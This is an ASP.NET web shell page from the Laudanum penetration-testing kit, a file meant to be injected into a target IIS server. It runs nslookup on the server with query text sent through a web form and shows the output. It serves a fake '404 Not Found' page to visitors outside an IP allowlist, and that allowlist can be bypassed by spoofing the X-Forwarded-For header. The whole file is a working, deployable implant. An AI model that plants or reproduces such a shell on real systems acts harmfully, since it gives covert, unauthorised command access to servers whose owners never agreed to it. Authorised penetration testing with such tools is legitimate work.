<%@ Page Language="C#"%>
<%@ Import Namespace="System" %>
<html><head><title>Laudanum - DNS</title></head><body>
<script runat="server">

/* *****************************************************************************
***
*** Laudanum Project
*** A Collection of Injectable Files used during a Penetration Test
***
*** More information is available at:
***  http://laudanum.secureideas.com
***  laudanum@secureideas.com
***
***  Project Leads:
***         Kevin Johnson <kevin@secureideas.com>
***
*** Copyright 2012 by Kevin Johnson and the Laudanum Team
***
********************************************************************************
***
*** This file provides shell access to DNS on the system.
*** Written by James Jardine <james@secureideas.com>
***
********************************************************************************
*** This program is free software; you can redistribute it and/or
*** modify it under the terms of the GNU General Public License
*** as published by the Free Software Foundation; either version 2
*** of the License, or (at your option) any later version.
***
*** This program is distributed in the hope that it will be useful,
*** but WITHOUT ANY WARRANTY; without even the implied warranty of
*** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*** GNU General Public License for more details.
***
*** You can get a copy of the GNU General Public License from this
*** address: http://www.gnu.org/copyleft/gpl.html#SEC1
*** You can also write to the Free Software Foundation, Inc., 59 Temple
*** Place - Suite 330, Boston, MA  02111-1307, USA.
***
***************************************************************************** */

    // ********************* Config entries below ***********************************
    // IPs are enterable as individual addresses  
    string[] allowedIPs = new string[3] { "::1", "192.168.1.1", "127.0.0.1" };

    // ***************** No editable content below this line **************************

string stdout = "";
string stderr = "";
string[] qtypes = "Any,A,AAAA,A+AAAA,CNAME,MX,NS,PTR,SOA,SRV".Split(',');
void die() {
	//HttpContext.Current.Response.Clear();
	HttpContext.Current.Response.StatusCode = 404;
	HttpContext.Current.Response.StatusDescription = "Not Found";
	HttpContext.Current.Response.Write("<h1>404 Not Found</h1>");
	HttpContext.Current.Server.ClearError();
	HttpContext.Current.Response.End();
}

void Page_Load(object sender, System.EventArgs e) {
	// check if the X-Fordarded-For header exits
	string remoteIp;
	if (HttpContext.Current.Request.Headers["X-Forwarded-For"] == null) {
		remoteIp = Request.UserHostAddress;
	} else {
		remoteIp = HttpContext.Current.Request.Headers["X-Forwarded-For"].Split(new char[] { ',' })[0]; 
	}

	bool validIp = false;
	foreach (string ip in allowedIPs) {
		validIp = (validIp || (remoteIp == ip));
	}
	
	if (!validIp) {
		die();
	}

    
    string qType = "Any";
    bool validType = false;
    if (Request.Form["type"] != null)
    {
        qType = Request.Form["type"].ToString();
        foreach (string s in qtypes)
        {
            if (s == qType)
            {
                validType = true;
                break;
            }
        }
        if (!validType)
            qType = "Any";
    }
    
    
	if (Request.Form["query"] != null) 
    {
        string query = Request.Form["query"].Replace("  ", string.Empty).Replace("  ", string.Empty);
        
        if(query.Length > 0)
        {
            System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("nslookup", "-type=" + qType + " " + query);
            // The following commands are needed to redirect the standard output and standard error.
		    procStartInfo.RedirectStandardOutput = true;
		    procStartInfo.RedirectStandardError = true;
		    procStartInfo.UseShellExecute = false;
            
            // Do not create the black window.
		    procStartInfo.CreateNoWindow = true;

            // Now we create a process, assign its ProcessStartInfo and start it
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo = procStartInfo;
            p.Start();
            // Get the output and error into a string
            stdout = p.StandardOutput.ReadToEnd();
            stderr = p.StandardError.ReadToEnd();
        }
	}
}
</script>
<form method="post">
QUERY: <input type="text" name="query"/><br />
Type: <select name="type">
<%
    foreach (string s in qtypes)
    {
        Response.Write("<option value=\"" + s + "\">" + s + "</option>");
    }
     %>
</select>
<input type="submit"><br/>
STDOUT:<br/>
<pre><% = stdout.Replace("<", "&lt;") %></pre>
<br/>
<br/>
<br/>
STDERR:<br/>
<pre><% = stderr.Replace("<", "&lt;") %></pre>
</body>
</html>

